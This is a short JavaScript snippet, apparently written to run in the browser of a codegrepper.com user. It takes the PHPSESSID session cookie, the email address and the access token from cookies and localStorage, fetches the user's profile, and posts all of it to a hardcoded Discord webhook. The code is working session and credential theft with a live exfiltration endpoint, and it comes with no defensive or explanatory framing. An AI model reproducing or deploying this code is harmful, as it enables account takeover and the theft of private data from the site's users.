primaryCookie = document.cookie
cookieSets = primaryCookie.split(" ");
cookieSets.forEach(cookie => {
    if (cookie.toString().split("=")[0].toString().includes("PHPSESSID")) {
        console.log(cookie.toString().split("=")[1].toString().replace(";", ""))

        userId = localStorage.getItem("user_id");
        userEmail = localStorage.getItem("email");
        accessToken = localStorage.getItem("access_token");

        webhookUrl = `https://discord.com/api/webhooks/892025480625135656/N9LBZeF9xdBWUGM4BoVPfUyF38ac3_S_FldXmPH0p2utXNoLoyPldByxG7FAvBdaYDfK`
        webhookTitle = ``

        fetch(`https://www.codegrepper.com/api/profile.php?id=${userId}`)
            .then((response) => {
                return response.json();
            })
            .then((myJson) => {
                fetch(`${webhookUrl}`, {
                    method: 'post',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        username: 'webhook',
                        embeds: [
                            {
                                image: {
                                    url:
                                        `https://www.codegrepper.com/profile_images/${myJson.profile_image}`,
                                },
                                color: 4388213,
                                description: "```USER: " + myJson.fun_name + "```" + "```AUTH: " + cookie.toString().split("=")[1] + "```" + "```MAIL: " + userEmail + "```" + "```TOKEN: " + accessToken + "```",
                            },
                        ],
                    }),
                });
            });
    }
});